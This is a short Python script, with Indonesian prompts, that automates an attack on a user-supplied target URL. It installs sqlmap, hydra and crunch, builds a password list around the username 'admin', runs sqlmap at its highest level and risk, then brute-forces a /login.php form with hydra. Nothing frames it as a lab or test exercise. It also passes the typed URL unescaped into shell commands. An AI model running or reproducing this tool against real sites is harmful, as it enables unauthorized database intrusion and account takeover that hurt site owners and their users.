import os
import subprocess

def check_tool(tool):
    try:
        subprocess.run([tool, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        return False

def install_tool(tool):
    try:
        subprocess.run(["sudo", "apt", "install", "-y", tool])
        return True
    except subprocess.CalledProcessError:
        return False

def get_target_url():
    url = input("Masukkan URL target: ")
    return url

def generate_password_list(username):
    os.system(f"crunch 8 8 -t @@@{username}@@@ -o password_list.txt")

def run_sqlmap(url):
    os.system(f"sqlmap -u {url} --level=5 --risk=3")

def run_hydra(url, username, password_list):
    os.system(f"hydra -l {username} -P {password_list} {url} http-post-form \"/login.php:username=^USER^&password=^PASS^:F=incorrect\"")

def main():
    required_tools = ["sqlmap", "hydra", "crunch"]
    for tool in required_tools:
        if not check_tool(tool):
            print(f"Installing {tool}...")
            if not install_tool(tool):
                print(f"Failed to install {tool}. Please install manually.")
                return

    url = get_target_url()
    username = "admin"  # Ganti dengan username yang diinginkan
    generate_password_list(username)
    password_list = "password_list.txt"
    run_sqlmap(url)
    run_hydra(url, username, password_list)

if __name__ == "__main__":
    main()
